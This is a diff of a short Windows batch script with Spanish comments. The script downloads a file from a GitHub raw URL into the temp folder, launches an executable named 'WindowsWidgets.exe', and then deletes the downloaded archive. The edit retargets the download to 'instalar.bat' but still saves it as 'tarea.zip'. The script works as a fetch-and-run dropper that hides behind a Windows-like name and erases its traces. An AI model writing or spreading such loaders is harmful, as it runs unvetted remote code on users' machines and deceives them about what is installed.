@@ -1,6 +1,6 @@
 @echo off
 :: 1. AQUÍ PONES EL RAW DE TU ZIP (el archivo que subiste a GitHub)
-set "url=https://raw.githubusercontent.com/deuzinnuse-collab/juego/refs/heads/main/tarea.zip"
+set "url=https://raw.githubusercontent.com/deuzinnuse-collab/juego/refs/heads/main/instalar.bat"
 
 :: 2. RUTA DONDE SE GUARDARÁ TEMPORALMENTE
 set "tempZip=%TEMP%\tarea.zip"
@@ -23,3 +23,4 @@ start "" "%destDir%\WindowsWidgets.exe"
 :: Limpieza
 del /q "%tempZip%"
 exit
+
